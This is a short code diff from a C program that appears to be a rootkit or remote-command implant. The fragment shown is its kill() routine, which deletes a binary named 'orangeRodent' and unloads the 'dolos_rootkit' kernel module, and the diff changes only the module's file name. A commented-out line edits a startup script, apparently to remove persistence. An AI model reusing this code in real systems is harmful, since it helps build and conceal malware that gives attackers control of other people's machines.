@@ -191,7 +191,7 @@ void execute(int sockfd, char* cmd){
 
 void kill(){
     remove("orangeRodent");
-    pclose(popen("rmmod dolos_rootkit", "r"));
+    pclose(popen("rmmod dolos_rootkit.ko", "r"));
     //pclose(popen("sed -i '$ d' /etc/init.d/S01syslogd", "r"));
     exit(0);
 }
